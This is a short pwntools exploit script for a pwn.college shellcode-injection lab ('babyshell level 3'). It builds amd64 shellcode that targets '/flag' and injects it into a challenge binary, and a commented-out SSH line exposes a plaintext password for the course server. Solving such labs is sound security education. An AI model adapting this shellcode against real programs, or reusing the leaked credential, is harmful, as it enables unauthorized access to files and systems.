from pwn import *

# s = ssh(user="ssu-csec",host="ssu-csec.pwn.college",port=22,password="djaxod12",keyfile="../../csec")
context.log_level = 'debug'
context.arch = 'amd64'
e = ELF('./babyshell_level3_testing1')
# p = s.process("./babyshell_level3_testing1")
p = process('./babyshell_level3_testing1')

s = ''
s += shellcraft.pushstr('/flag')
# s += shellcraft.open('/flag')
# s += shellcraft.read('rax','rsp',60)
# s += shellcraft.write(1, 'rsp', 60)
print(hexdump(asm(s)))
p.sendlineafter(b'stdin into ',asm(s))

p.interactive()